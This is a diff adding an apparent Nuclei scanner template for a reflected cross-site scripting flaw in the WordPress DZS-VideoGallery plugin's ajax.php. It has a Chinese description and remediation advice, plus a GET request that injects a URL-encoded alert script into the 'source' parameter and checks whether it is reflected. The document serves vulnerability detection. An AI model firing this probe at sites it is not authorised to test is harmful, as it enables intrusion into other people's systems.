@@ -1,0 +1,26 @@
+id: CNVD-2014-01187
+info:
+  name: WordPress_DZS-VideoGallery_-ajax.php_XSS漏洞_POC
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin DZS-VideoGallery 'ajax.php' 跨站脚本漏洞
+    WordPress是一款使用PHP语言开发的内容管理系统。DZS-VideoGallery是其中的一个DZS视频库插件。
+
+    WordPress插件DZS-VideoGallery 'ajax.php'存在跨站脚本漏洞。由于程序未能正确过滤用户提交的输入，攻击者可以利用漏洞在受影响的站点上下文的信任用户浏览器中执行任意脚本代码，窃取基于cookie的认证证书，并发动其他攻击。
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：http://digitalzoomstudio.net/docs/wpvideogallery/
+
+    临时修复方案：
+    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - ' contains(body,"<script>alert(\"bb2\")</script>") && status_code==200 '
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&height=400&width=610&type=vimeo&source=%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E'
+  method: GET
